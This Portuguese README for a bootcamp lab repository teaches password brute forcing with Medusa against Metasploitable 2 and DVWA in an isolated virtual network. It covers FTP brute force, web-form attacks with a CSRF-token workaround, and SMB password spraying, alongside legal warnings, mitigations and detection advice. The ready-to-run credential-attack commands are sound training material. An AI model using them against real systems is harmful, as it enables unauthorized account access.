# 🔐 Simulando um Ataque de Força Bruta de Senhas com Medusa e Kali Linux

> **Desafio de Projeto — DIO**
> Bootcamp *Cibersegurança do Zero à Prática*

[![Kali Linux](https://img.shields.io/badge/Kali%20Linux-2024.x-557C94?logo=kalilinux&logoColor=white)](https://www.kali.org/)
[![Medusa](https://img.shields.io/badge/Medusa-2.2-darkred)](http://foofus.net/goons/jmk/medusa/medusa.html)
[![Metasploitable 2](https://img.shields.io/badge/Metasploitable-2-red)](https://docs.rapid7.com/metasploit/metasploitable-2/)
[![Licença](https://img.shields.io/badge/licen%C3%A7a-MIT-green)](LICENSE)
[![Uso](https://img.shields.io/badge/uso-somente%20laborat%C3%B3rio-yellow)](LICENSE)

---

## 📌 Índice

- [Sobre o desafio](#-sobre-o-desafio)
- [Objetivos de aprendizagem](#-objetivos-de-aprendizagem)
- [Aviso legal e de escopo](#️-aviso-legal-e-de-escopo)
- [Arquitetura do laboratório](#️-arquitetura-do-laboratório)
- [Estrutura do repositório](#-estrutura-do-repositório)
- [Preparação do ambiente](#-preparação-do-ambiente)
- [Reconhecimento](#-reconhecimento)
- [Cenário 1 — FTP](#-cenário-1--ftp-força-bruta-com-medusa--m-ftp)
- [Cenário 2 — PHP form (DVWA)](#-cenário-2--php-form-dvwa-com-medusa--m-web-form)
- [Cenário 3 — SMB e password spraying](#-cenário-3--smb-e-password-spraying-medusa--m-smbnt)
- [Scripts auxiliares](#-scripts-auxiliares)
- [Entendendo o Medusa](#-entendendo-o-medusa)
- [Resultados obtidos](#-resultados-obtidos)
- [Mitigações e defesa](#️-mitigações-e-defesa)
- [Aprendizados](#-aprendizados)
- [Referências](#-referências)
- [Autor](#-autor)

---

## 🎯 Sobre o desafio

Este repositório é a entrega do desafio **"Criando um Ataque Brute Force de senhas com
Medusa e Kali Linux"**. O objetivo é **entender como ataques de força bruta funcionam por
dentro** — e, a partir desse entendimento, projetar defesas eficazes.

O trabalho foi dividido em três frentes:

| Frente | O que foi feito |
| --- | --- |
| 🧪 **Laboratório** | Duas VMs em rede *host-only* isolada: uma atacante (Kali) e uma alvo (Metasploitable 2 + DVWA) |
| ⚔️ **Ataque** | Três cenários reais: **FTP** (Medusa `ftp`), **formulário web** (Medusa `web-form` no DVWA) e **SMB** com *password spraying* (Medusa `smbnt`) |
| 🛡️ **Defesa** | Análise de cada ataque do ponto de vista de mitigação: lockout, rate limit, MFA, política de senhas, Fail2ban, detecção por logs |

> 💡 **A ideia central:** força bruta não é "magia" — é a consequência direta de uma
> política de senhas fraca somada à **ausência de limite de tentativas**. Todas as
> mitigações deste documento atacam exatamente esse segundo fator, que é o mais fácil
> de corrigir.

---

## 🎓 Objetivos de aprendizagem

- Compreender a diferença entre **força bruta**, **ataque de dicionário**,
  **password spraying** e **credential stuffing**;
- Montar um laboratório de segurança **isolado e seguro** usando VirtualBox;
- Dominar a sintaxe do **Medusa** e seus módulos (`ftp`, `web-form`, `smbnt`);
- Executar reconhecimento com **Nmap** e **enum4linux** antes do ataque;
- Validar as credenciais descobertas e acessar os serviços comprometidos;
- **Documentar** o processo de forma reproduzível (este repositório);
- Propor e justificar **contramedidas** para cada cenário.

### Conceitos-chave

```text
Força bruta pura      → todas as combinações possíveis (espaço de busca total)
Ataque de dicionário  → lista de senhas prováveis (o que o Medusa faz com -P)
Password spraying     → UMA senha fraca × MUITOS usuários (evita lockout)
Credential stuffing   → usuário:senha vazados de outro serviço (reuso de senha)
```

---

## ⚠️ Aviso legal e de escopo

> **Este material é exclusivamente educacional.**
>
> Todas as técnicas foram executadas contra **máquinas virtuais próprias**, em uma rede
> **host-only** (sem rota para a internet nem para a rede da empresa ou de terceiros).
>
> Utilizar estas técnicas contra qualquer sistema sem **autorização escrita e explícita**
> do proprietário é crime:
>
> - **Lei 12.737/2012** (Lei Carolina Dieckmann) — invasão de dispositivo informático;
> - **Lei 12.965/2014** (Marco Civil da Internet);
> - **LGPD** (Lei 13.709/2018) — no caso de exposição de dados pessoais;
> - E também viola termos de serviço de praticamente todos os provedores de nuvem.
>
> **Não teste** em redes de universidades, empresas, Wi-Fi público, hotéis, ou em
> qualquer IP que você não tenha certeza absoluta de ser seu. Escopo é a primeira
> regra do pentest — e a primeira pergunta a se fazer é sempre: *"eu tenho
> autorização?"*

Este repositório **não contém** capturas de tela de alvos reais, dados de terceiros
ou credenciais de produção. Os resultados ficam em `docs/RELATORIO_MODELO.md`, para
que você preencha com as **suas** evidências.

---

## 🏗️ Arquitetura do laboratório

```text
┌──────────────────────────────────────────────────────────────────────┐
│                        HOST FÍSICO (Windows/Linux/macOS)             │
│                                                                      │
│   ┌────────────────────────────────────────────────────────────┐     │
│   │        VirtualBox — rede HOST-ONLY 192.168.56.0/24         │     │
│   │        (sem NAT, sem bridge, isolada da internet)          │     │
│   │                                                            │     │
│   │   ┌─────────────────────────┐  ┌────────────────────────┐  │     │
│   │   │  VM 1 — KALI LINUX      │  │  VM 2 — ALVO           │  │     │
│   │   │  (atacante)             │  │  Metasploitable 2      │  │     │
│   │   │                         │  │  + DVWA                │  │     │
│   │   │  192.168.56.102         │  │  192.168.56.101        │  │     │
│   │   │  3 GB RAM / 2 vCPU      │  │  512 MB RAM / 1 vCPU   │  │     │
│   │   │                         │  │                        │  │     │
│   │   │  • Medusa    • Nmap     │◄─┼─►• vsftpd   :21         │  │     │
│   │   │  • enum4linux           │  │  • Apache   :80  (+DVWA)│  │     │
│   │   │  • smbclient            │  │  • Samba    :139/445   │  │     │
│   │   │  • python3              │  │  • (SSH :22 — fora do  │  │     │
│   │   │                         │  │     escopo do desafio) │  │     │
│   │   └─────────────────────────┘  └────────────────────────┘  │     │
│   └────────────────────────────────────────────────────────────┘     │
│                                                                      │
│        ⚠ Snapshots tirados ANTES de cada cenário                    │
└──────────────────────────────────────────────────────────────────────┘
```

| Item | VM 1 (Atacante) | VM 2 (Alvo) |
| --- | --- | --- |
| **SO** | Kali Linux 2024.x | Metasploitable 2 (Ubuntu 8.04) |
| **IP** | `192.168.56.102` | `192.168.56.101` |
| **RAM / vCPU** | 3 GB / 2 | 512 MB / 1 |
| **Rede** | Host-only (`vboxnet0`) | Host-only (`vboxnet0`) |
| **Função** | Executa o Medusa, Nmap e enumeração | Expõe FTP, HTTP/DVWA e SMB vulneráveis |

> 📖 Detalhes de instalação, criação da rede host-only e snapshots estão em
> **[`docs/01-ambiente.md`](docs/01-ambiente.md)**.

---

## 📂 Estrutura do repositório

```text
dio-medusa-bruteforce/
│
├── README.md                        ← você está aqui
├── LICENSE                          ← MIT + aviso de uso educacional
├── .gitignore                       ← ignora logs, segredos, credenciais
│
├── docs/
│   ├── 01-ambiente.md               ← VirtualBox, rede host-only, snapshots, isolamento
│   ├── 02-comandos.md               ← cheat sheet: Medusa, Nmap, enum4linux
│   ├── 03-mitigacoes.md             ← hardening e detecção serviço por serviço
│   ├── 04-reflexao.md               ← conceitos, ética e lições (para reescrever)
│   ├── 05-publicar-no-github.md     ← como publicar e entregar na DIO
│   └── RELATORIO_MODELO.md          ← MODELO EM BRANCO para os seus resultados
│
├── scripts/
│   ├── lib_lab.sh                   ← biblioteca de salvaguardas de escopo
│   ├── preflight_lab.sh             ← checagem do ambiente antes do teste
│   ├── smb_spray.sh                 ← password spraying em SMB (laço por senha)
│   ├── dvwa_login_check.py          ← login no DVWA com suporte a token anti-CSRF
│   └── publicar.sh                  ← publica o repo no GitHub via gh CLI
│
├── wordlists/
│   ├── README.md
│   ├── usuarios.txt                 ← usuários (FTP)
│   ├── senhas.txt                   ← senhas (FTP)
│   ├── usuarios-smb.txt             ← usuários (SMB)
│   └── senhas-spray.txt             ← senhas para spraying (curta, de propósito)
│
├── images/                          ← suas capturas de tela (veja images/README.md)
└── logs/                            ← saídas dos scripts (NÃO versionadas)
```

---

## 🚀 Preparação do ambiente

### 1. Ferramentas na VM atacante (Kali)

```bash
sudo apt update
sudo apt install -y medusa nmap curl smbclient enum4linux python3-requests
```

Verifique o Medusa e os módulos que serão usados:

```bash
medusa -V
medusa -d | grep -E 'ftp|web-form|smbnt'
```

### 2. Ambiente na VM alvo (Metasploitable 2)

O appliance já vem com **vsftpd**, **Apache + DVWA** e **Samba** habilitados.
Confirme apenas se os serviços respondem:

```bash
# do Kali, para o alvo
nmap -Pn -sV -p 21,80,139,445 192.168.56.101
```

### 3. Preflight automatizado (recomendado)

O script `preflight_lab.sh` verifica tudo — ferramentas, módulos, wordlists,
isolamento de rede e portas do alvo:

```bash
# checagens locais (sem tocar no alvo)
./scripts/preflight_lab.sh --alvo 192.168.56.101

# com teste de portas
./scripts/preflight_lab.sh --alvo 192.168.56.101 --confirmo-lab -v
```

### 4. Snapshot — faça isso **sempre**

Antes de cada cenário, com as duas VMs desligadas, tire um snapshot no VirtualBox
(`Máquina → Tirar Snapshot`). Depois do teste, **reverta** para o estado limpo.
Assim você pode repetir os ataques quantas vezes quiser, de forma idêntica.

---

## 🔎 Reconhecimento

Antes de qualquer ataque, enumere. O ataque é a **última** etapa, não a primeira.

```bash
# Varredura de serviços nas portas que interessam
nmap -Pn -sV -p 21,80,139,445 192.168.56.101

# Scripts padrão do Nmap para FTP e SMB (anônimo, shares, usuários)
nmap -Pn -p 21  --script ftp-anon           192.168.56.101
nmap -Pn -p 139,445 --script "smb-enum-shares,smb-enum-users" 192.168.56.101

# enum4linux: usuários, grupos, shares e política de senha do SMB
enum4linux -a 192.168.56.101

# Testar acesso anônimo ao FTP
ftp 192.168.56.101     # usuário: anonymous  |  senha: (enter)
```

**O que o reconhecimento entrega:**

- ✅ Quais serviços realmente escutam (e versões);
- ✅ Se o FTP aceita login anônimo (se sim, o brute force é desnecessário!);
- ✅ A lista de **usuários válidos** do SMB (`smb-enum-users`), que alimenta o spraying;
- ✅ A política de senha do domínio (tamanho mínimo, lockout) — informação vital
  para decidir se um brute force **vai** ou **não** bloquear contas.

> 🎯 **Lição:** metade do trabalho de um ataque de credenciais é enumeração. Uma
> lista de usuários válidos reduz o espaço de busca de milhões para dezenas.

---

## 🧪 Cenário 1 — FTP (força bruta com `medusa -M ftp`)

### Contexto

O **vsftpd 2.3.4** do Metasploitable aceita login com usuário e senha locais do
sistema. As contas do appliance têm senhas padrão conhecidas — um cenário realista
de "senha que nunca foi trocada após a instalação".

### Wordlists

```bash
cat wordlists/usuarios.txt   # msfadmin, user, postgres, service, root...
cat wordlists/senhas.txt     # msfadmin, password, 123456, ...
```

### Execução

```bash
# Teste inicial da conectividade e do módulo
medusa -h 192.168.56.101 -u msfadmin -p msfadmin -M ftp

# Força bruta completa: 20 usuários × 24 senhas = 480 combinações
medusa -h 192.168.56.101 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas.txt \
       -M ftp \
       -e ns \
       -t 4 \
       -c 1000 \
       -f \
       -O logs/ftp-resultado.txt
```

### Flags explicadas

| Flag | Por que foi usada |
| --- | --- |
| `-M ftp` | Módulo FTP do Medusa |
| `-U` / `-P` | Listas de usuários e senhas |
| `-e ns` | Testa também *sem senha* (`n`) e *senha = usuário* (`s`) — dois erros clássicos |
| `-t 4` | 4 logins concorrentes (baixo de propósito, para o lab ficar legível) |
| `-c 1000` | Espera 1000 µs antes de checar o socket; **necessário contra o vsftpd**, que derruba conexões após falhas |
| `-f` | Para o host após encontrar a primeira credencial válida |
| `-O` | Grava os achados em arquivo de log |

> ⚠️ **Sobre o `-c 1000`:** o vsftpd do Metasploitable aplica um mecanismo
> anti-bruteforce que **fecha a conexão** após algumas tentativas falhas. Se o
> Medusa não verificar o socket antes de cada login, ele tenta enviar credenciais
> em uma conexão morta e reporta "erro de conexão" para tudo. Aumentar o `-c`
> faz o Medusa detectar a queda e reconectar — é a diferença entre "não funciona"
> e "funciona".

### Resultado esperado

```text
ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin ...
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

### Validação do acesso

```bash
ftp 192.168.56.101
# Name: msfadmin
# 331 Please specify the password.
# Password: msfadmin
# 230 Login successful.
ftp> ls
```

> 📸 Registre a saída em uma captura de tela e coloque em `images/01-ftp-medusa.png`
> (veja [`images/README.md`](images/README.md) para a convenção de nomes).

---

## 🌐 Cenário 2 — PHP form (DVWA) com `medusa -M web-form`

### Contexto

O **DVWA** (*Damn Vulnerable Web Application*) roda em `http://192.168.56.101/dvwa/`
e tem um formulário de login. A dificuldade aqui não é a senha: é a **sintaxe do
formulário** que o Medusa precisa reproduzir.

### 1. Descobrir a estrutura do formulário

```bash
curl -s http://192.168.56.101/dvwa/login.php | grep -E 'form|input'
```

Saída típica (resumida):

```html
<form action="login.php" method="post">
  <input type="text"     name="username">
  <input type="password" name="password">
  <input type="submit"   value="Login" name="Login">
  <!-- em algumas configurações: -->
  <input type="hidden"   name="user_token" value="a1b2c3d4...">
</form>
```

Daí se extraem três informações para o Medusa:

1. **`action`** → `login.php` (o caminho do POST);
2. **`method`** → `post`;
3. **campos** → `username`, `password`, `Login`.

### 2. Montar o `FORM-DATA`

A sintaxe do módulo `web-form` é:

```text
FORM-DATA:"<metodo>?<campo1>=&<campo2>=&<botao>=<valor>"
```

O Medusa preenche **automaticamente a primeira variável com o usuário e a segunda
com a senha**. Portanto a ordem importa:

```bash
FORM-DATA:"post?username=&password=&Login=Login"
#                  ^^^^^^^^ usuário
#                             ^^^^^^^^^ senha
#                                        ^^^^^^^^^^^ botão submit
```

### 3. Executar

```bash
medusa -h 192.168.56.101 \
       -u admin \
       -P wordlists/senhas.txt \
       -M web-form \
       -m FORM-DATA:"post?username=&password=&Login=Login" \
       -m DENY-SIGNAL:"Login failed" \
       -t 2 \
       -f \
       -O logs/dvwa-resultado.txt
```

### Flags explicadas

| Flag | Por que foi usada |
| --- | --- |
| `-M web-form` | Módulo de formulário HTTP do Medusa |
| `-m FORM-DATA:...` | Diz qual página, método e campos usar (1º = usuário, 2º = senha) |
| `-m DENY-SIGNAL:"Login failed"` | **Marcador de falha**: se a resposta contém esse texto, o login foi negado |
| `-t 2` | Baixo: o Apache do Metasploitable é antigo e derruba conexões |
| `-f` | Para após o primeiro acerto |

> ⚠️ **`DENY-SIGNAL`, não `DENIAL-SIGNAL`.** Esse é o erro mais comum ao usar o
> `web-form`: o nome do parâmetro é `DENY-SIGNAL`, com a string que aparece na
> página de **login inválido**. Se estiver errado, o Medusa considera **toda**
> resposta como sucesso (ou nenhuma) — e o resultado vira lixo.

### 4. O problema do token anti-CSRF

Se o DVWA estiver com `user_token` (proteção anti-CSRF ligada), o Medusa **falha**:
cada POST precisa de um token novo, gerado no GET anterior, e o Medusa não faz
esse fluxo de "GET → extrai token → POST".

Duas soluções:

**a) Reduzir a segurança do DVWA no laboratório** (desejável aqui, para ver o
mecanismo do Medusa funcionando):

```text
DVWA → DVWA Security → Low         (no nível low, o token não é exigido)
```

Ou, em `config/config.inc.php`, `$_DVWA[ 'disable_authentication' ]` e o nível de
segurança padrão. **Só faça isso na VM alvo isolada, nunca em aplicação real.**

**b) Usar o verificador em Python deste repositório**, que trata o token:

```bash
python3 scripts/dvwa_login_check.py \
    --url http://192.168.56.101/dvwa \
    --usuario admin \
    --lista wordlists/senhas.txt \
    --confirmo-lab
```

Ele faz: `GET login.php` → captura cookie + `user_token` → `POST` com os 4 campos
→ classifica a resposta → confirma a sessão autenticada em `index.php`.

> 🎯 **Lição:** CSRF token é uma defesa **de graça** contra brute forcers que não
> mantêm sessão. É uma das razões pelas quais o Medusa/Hydra são mais eficazes
> contra serviços de rede (FTP, SMB, SSH) do que contra aplicações web modernas.

### 5. Alternativa: DVWA Security = Low

Com o DVWA em **Low**, o `FORM-DATA` acima funciona direto:

```text
ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: admin Password: password [SUCCESS]
```

> 📸 Captura sugerida: `images/02-dvwa-medusa.png` e `images/03-dvwa-apos-login.png`.

---

## 🗂️ Cenário 3 — SMB e password spraying (`medusa -M smbnt`)

### Contexto

O **Samba** do Metasploitable expõe shares com permissões frouxas. O ataque
tradicional de força bruta aqui é **ruim** (bloqueia contas), então usamos
**password spraying**: poucas senhas contra muitos usuários.

### 1. Enumeração

```bash
enum4linux -a 192.168.56.101

# Só os usuários, prontos para virar wordlist:
enum4linux -U 192.168.56.101 | grep 'user:\[' | sed -E 's/.*user:\[([^]]+)\].*/\1/' > usuarios-smb.txt
```

### 2. A diferença fundamental

```text
❌ Força bruta (o que NÃO fazemos no SMB)
   for usuario in usuarios:
       for senha in senhas:
           tenta(usuario, senha)      # 15 usuários × 5 senhas = 75 logins
                                      # cada conta leva 5 falhas → risco de lockout

✅ Password spraying (o que fazemos)
   for senha in senhas:
       for usuario in usuarios:
           tenta(usuario, senha)      # 5 rodadas × 15 usuários = 75 logins
                                      # cada conta leva só 5 falhas ESPAÇADAS
```

O número de tentativas é o mesmo — o que muda é a **distribuição** e o
**intervalo**, que é justamente o que as políticas de lockout contam.

### 3. Execução manual (uma senha por vez)

```bash
# Rodada 1: a senha mais provável contra todos os usuários
medusa -h 192.168.56.101 \
       -U wordlists/usuarios-smb.txt \
       -p password \
       -M smbnt \
       -t 2 \
       -O logs/smb-rodada1.txt

# Rodada 2
medusa -h 192.168.56.101 -U wordlists/usuarios-smb.txt -p msfadmin -M smbnt -t 2
```

### 4. Execução automatizada (script incluído)

O `scripts/smb_spray.sh` já implementa o laço **senha → usuários**, com pausas
e coleta de resultados em CSV:

```bash
# dry-run: mostra o plano, não envia nada
./scripts/smb_spray.sh --alvo 192.168.56.101

# execução real
./scripts/smb_spray.sh --alvo 192.168.56.101 --confirmo-lab

# com domínio e log detalhado
./scripts/smb_spray.sh --alvo 192.168.56.101 --dominio LAB --confirmo-lab -v
```

Saídas geradas em `logs/<data-hora>-smb-spray/`:

| Arquivo | Conteúdo |
| --- | --- |
| `spray.log` | Log completo da execução |
| `medusa-senha-N.txt` | Saída bruta do Medusa por rodada |
| `achados.csv` | Credenciais válidas: `data_hora,senha,usuario,ip` |

### 5. Validar o acesso

```bash
# Listar shares (aceita sessão anônima em muitos casos)
smbclient -L //192.168.56.101 -N

# Acessar com a credencial descoberta
smbclient //192.168.56.101/tmp -U msfadmin%msfadmin
smb: \> ls
smb: \> put arquivo.txt       # gravação em share frouxo = achado relevante
```

> 📸 Capturas sugeridas: `images/04-enum4linux.png`, `images/05-smb-spray.png`,
> `images/06-smbclient-share.png`.

---

## 🛠️ Scripts auxiliares

Todos os scripts seguem o **princípio da trava de segurança**: sem a flag
`--confirmo-lab`, nada é enviado ao alvo. Isso evita acidentes com IP errado.

| Script | O que faz | Modo seguro |
| --- | --- | --- |
| `scripts/lib_lab.sh` | Biblioteca: logs, **guarda de escopo** (só IP privado), diretórios de saída | — |
| `scripts/preflight_lab.sh` | Checa ferramentas, módulos, wordlists, isolamento e portas | Só testes locais |
| `scripts/smb_spray.sh` | Password spraying SMB com laço por senha + CSV | Dry-run |
| `scripts/dvwa_login_check.py` | Login no DVWA com token anti-CSRF | Dry-run |
| `scripts/publicar.sh` | Cria repo, faz commit e push, define descrição/tópicos | `--somente-checar` |

### A guarda de escopo (`lib_lab.sh`)

```bash
# Aceita:    10.0.0.0/8   172.16.0.0/12   192.168.0.0/16   127.0.0.0/8
# Recusa:    8.8.8.8  e qualquer hostname que resolva para IP público
$ ./scripts/preflight_lab.sh --alvo 8.8.8.8
[erro]  Escopo recusado: 8.8.8.8 nao pertence a uma rede privada.
[info]  Permitido: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 e 127.0.0.0/8.
```

### Verificação de sintaxe

```bash
bash -n scripts/*.sh                          # scripts Bash
python3 -m py_compile scripts/dvwa_login_check.py   # script Python
```

---

## 🔧 Entendendo o Medusa

### Sintaxe geral

```text
medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] \
       [-C combo] -M module [OPÇÕES]
```

### Flags mais importantes

| Flag | Significado |
| --- | --- |
| `-h` / `-H` | Host único / arquivo de hosts |
| `-u` / `-U` | Usuário único / arquivo de usuários |
| `-p` / `-P` | Senha única / arquivo de senhas |
| `-M` | **Módulo** (`ftp`, `web-form`, `smbnt`, `ssh`, `mysql`...) |
| `-m` | Parâmetro do módulo (pode repetir) |
| `-e ns` | Extras: `n` = sem senha, `s` = senha igual ao usuário |
| `-t` | Logins **concorrentes** (default: 1) |
| `-T` | Hosts concorrentes |
| `-c` | µs de espera para verificar socket (usar `1000` no vsftpd) |
| `-f` | Para o host após o primeiro acerto |
| `-F` | Para **tudo** após o primeiro acerto |
| `-O` | Arquivo de log de achados |
| `-Z` | Retoma uma varredura interrompida |
| `-b` | Suprime o banner (bom para scripts) |
| `-v` | Verbosidade 0–6 (6 = mais detalhes) |

### Módulos usados neste desafio

| Módulo | Protocolo | Requisito especial |
| --- | --- | --- |
| `ftp` | FTP (porta 21) | `-c 1000` contra vsftpd |
| `web-form` | HTTP POST em formulário | `FORM-DATA` + `DENY-SIGNAL` |
| `smbnt` | SMB (139/445) | Opcional `-m GROUP:<domínio>` |

### `-t` alto demais quebra tudo

O Medusa é **paralelo por natureza**, mas `-t 100` contra um Apache de 2009 derruba
o serviço e produz **falsos negativos** (o alvo para de responder e você conclui
"não há credenciais"). Comece com `-t 2` ou `-t 4` e aumente só se necessário.

---

## 📊 Resultados obtidos

> ### ⚠️ Preencha com os SEUS resultados
>
> Este repositório **não inventa resultados**. Os campos abaixo devem ser
> preenchidos por você, após **executar** os três cenários no seu laboratório.
> Use **[`docs/RELATORIO_MODELO.md`](docs/RELATORIO_MODELO.md)** como template e
> cole as capturas de tela em `images/`.

### Resumo do laboratório

| Cenário | Serviço | Ferramenta | Credencial encontrada | Tempo | Observações |
| --- | --- | --- | --- | --- | --- |
| 1 | FTP :21 | `medusa -M ftp` | *a preencher* | *a preencher* | |
| 2 | HTTP :80 (DVWA) | `medusa -M web-form` | *a preencher* | *a preencher* | |
| 3 | SMB :139/445 | `medusa -M smbnt` (spraying) | *a preencher* | *a preencher* | |

### Evidências

| # | Arquivo | Descrição |
| --- | --- | --- |
| 01 | `images/01-ftp-medusa.png` | Execução do Medusa contra o FTP |
| 02 | `images/02-dvwa-medusa.png` | Execução contra o formulário do DVWA |
| 03 | `images/03-dvwa-apos-login.png` | Painel do DVWA após o login |
| 04 | `images/04-enum4linux.png` | Enumeração SMB com enum4linux |
| 05 | `images/05-smb-spray.png` | Password spraying em SMB |
| 06 | `images/06-smbclient-share.png` | Acesso ao share com a credencial obtida |

---

## 🛡️ Mitigações e defesa

Cada técnica deste laboratório tem uma contramedida **específica** — e as mais
eficazes são baratas. Detalhes completos em **[`docs/03-mitigacoes.md`](docs/03-mitigacoes.md)**.

### 1. Contramedidas universais (servem para FTP, web e SMB)

| Contramedida | O que ela bloqueia | Custo |
| --- | --- | --- |
| **Rate limiting / throttling** | Qualquer brute force: torna milhões de tentativas inviáveis em tempo | Baixo |
| **Lockout progressivo** (5 falhas → 1 min → 5 min → 15 min) | Força bruta e spraying agressivo | Baixo |
| **MFA** (TOTP, push, FIDO2) | **Tudo**: mesmo com a senha certa, o atacante não passa | Médio |
| **Senhas longas + bloqueio de senhas vazadas** | Dicionário e credential stuffing | Baixo |
| **Monitoramento + alerta** | Detecta o ataque em andamento (não bloqueia, mas permite reagir) | Médio |
| **Listas de bloqueio de IP (Fail2ban)** | Repetição automática | Baixo |

### 2. Por serviço

#### FTP

```text
✅ Desabilitar login anônimo         anonymous_enable=NO
✅ Desabilitar o serviço se não for necessário (o melhor controle é não existir)
✅ Preferir SFTP (SSH) ou FTPS       a senha nunca trafega em claro
✅ Restringir por firewall          só os IPs que realmente precisam
✅ Chroot por usuário                protege o sistema de arquivos
```

#### Aplicação web (DVWA e equivalentes)

```text
✅ CSRF token em todos os formulários (quebra automatização "burra")
✅ CAPTCHA após N falhas
✅ Rate limit por IP + por conta (ex.: 5 tentativas/min)
✅ MFA para acesso administrativo
✅ Bloqueio temporário progressivo
✅ Não revelar se o erro foi no usuário ou na senha
✅ WAF com regras de brute force (ModSecurity / Cloudflare / AWS WAF)
```

#### SMB / Active Directory

```text
✅ Política de senha forte + comprimento mínimo de 12–14 caracteres
✅ Bloqueio de senhas comuns (Azure AD Password Protection / LAPS)
✅ Restringir SMBv1 e desabilitar NTLMv1
✅ Segmentação de rede — SMB nunca exposto à internet (porta 445!)
✅ Monitorar Event ID 4625 (falha de logon) e 4771 (Kerberos)
✅ Service accounts com senhas gerenciadas (gMSA)
```

### 3. Detecção — o que o atacante deixa para trás

| Serviço | Log | Sinal |
| --- | --- | --- |
| FTP (vsftpd) | `/var/log/vsftpd.log`, `auth.log` | Rajada de `FAIL LOGIN` do mesmo IP |
| Apache | `access.log` | Muitos `POST /login.php` em sequência, `User-Agent` do Medusa |
| Samba | `log.smbd`, Event ID 4625 | N falhas por conta em curto intervalo, muitos usuários diferentes |

**Regra de ouro do Blue Team:** um único `4625` não significa nada; **50 em 30
segundos** significa ataque. A detecção depende de **correlação**, não de um
evento isolado.

> 📖 Guia completo, com comandos de configuração e exemplos de regras: **[`docs/03-mitigacoes.md`](docs/03-mitigacoes.md)**.

---

## 🧠 Aprendizados

### Técnicos

- **Reconhecimento > ataque.** A enumeração de usuários válidos (SMB) e o teste
  de login anônimo (FTP) frequentemente entregam o resultado sem nenhum brute force.
- **O Medusa é sensível ao alvo.** `-c 1000` no vsftpd e `-t` baixo no Apache
  antigo não são "detalhes": são a diferença entre funcionar e dar falso negativo.
- **`web-form` é frágil por design.** Qualquer mudança no HTML (ou um token
  anti-CSRF) quebra a automação — o que, do ponto de vista defensivo, é ótimo.
- **Força bruta é limitada pelo espaço de busca.** Senhas de 8+ caracteres com
  variedade tornam o ataque inviável em tempo; o ataque realista é sempre
  dicionário ou spraying.

### Defensivos

- A defesa mais eficaz **não é a senha complexa**, é o **limite de tentativas**
  combinado com **MFA**. Um sistema com `5 tentativas/min` e MFA é praticamente
  imune a este laboratório inteiro.
- **Senha padrão de fornecedor** é uma vulnerabilidade de configuração, não de
  software — e continua sendo uma das causas mais comuns de comprometimento real.
- **Logs são a diferença entre "não sabemos" e "detectamos em 40 segundos".**

### Éticos

- Escopo e autorização vêm **antes** da técnica. Um pentest sem autorização
  escrita é crime, não é pentest.
- O laboratório isolado (host-only) não é burocracia: é o que torna o aprendizado
  seguro para você e para terceiros.
- O conhecimento de ataque serve para **construir defesas melhores** — esse é o
  propósito de um profissional de segurança.

> 📖 Reflexão completa: **[`docs/04-reflexao.md`](docs/04-reflexao.md)**.

---

## 📚 Referências

### Ferramentas e documentação

- **Medusa** — site oficial: <http://foofus.net/goons/jmk/medusa/medusa.html>
- **Medusa man page**: `man medusa` no Kali
- **Kali Linux** — <https://www.kali.org/docs/>
- **Nmap** — <https://nmap.org/book/man.html>
- **enum4linux** — <https://github.com/CiscoCXSecurity/enum4linux>
- **Metasploitable 2** — <https://docs.rapid7.com/metasploit/metasploitable-2/>
- **DVWA** — <https://github.com/digininja/DVWA>
- **VirtualBox** — <https://www.virtualbox.org/manual/>

### Defesa e referências normativas

- **OWASP — Blocking Brute Force Attacks**: <https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks>
- **OWASP ASVS v4** (controle de autenticação, cap. V2)
- **NIST SP 800-63B** — Digital Identity Guidelines (política de senhas)
- **MITRE ATT&CK — T1110 Brute Force**: <https://attack.mitre.org/techniques/T1110/>
- **CIS Controls v8** — Controle 4, 5 e 6 (configuração segura e gestão de contas)
- **Lei 12.737/2012** — <https://www.planalto.gov.br/ccivil_03/_ato2011-2014/2012/lei/l12737.htm>

### Documentação interna deste repositório

| Documento | Conteúdo |
| --- | --- |
| [`docs/01-ambiente.md`](docs/01-ambiente.md) | Montagem do laboratório, rede host-only, snapshots |
| [`docs/02-comandos.md`](docs/02-comandos.md) | Cheat sheet de Medusa, Nmap e enum4linux |
| [`docs/03-mitigacoes.md`](docs/03-mitigacoes.md) | Hardening e detecção por serviço |
| [`docs/04-reflexao.md`](docs/04-reflexao.md) | Conceitos, ética e lições |
| [`docs/05-publicar-no-github.md`](docs/05-publicar-no-github.md) | Como publicar e entregar na DIO |
| [`docs/RELATORIO_MODELO.md`](docs/RELATORIO_MODELO.md) | Template para os seus resultados |

---

## 👤 Autor

**Marcos Santos**

- GitHub: [@marcossantos200480](https://github.com/marcossantos200480)
- Projeto desenvolvido para o bootcamp **Cibersegurança do Zero à Prática** — [DIO](https://www.dio.me/)

> ⭐ Se este material te ajudou a entender o assunto, deixe uma estrela no repositório.

---

## 📄 Licença

Distribuído sob a licença **MIT** — veja [`LICENSE`](LICENSE).
O uso das técnicas aqui descritas é permitido **exclusivamente** em ambientes
próprios e isolados, para fins de estudo. Veja o aviso legal no topo deste README.

---

<p align="center">
  <sub>Feito com 🧪 laboratório isolado, ☕ e muita leitura de <code>man medusa</code>.</sub>
</p>
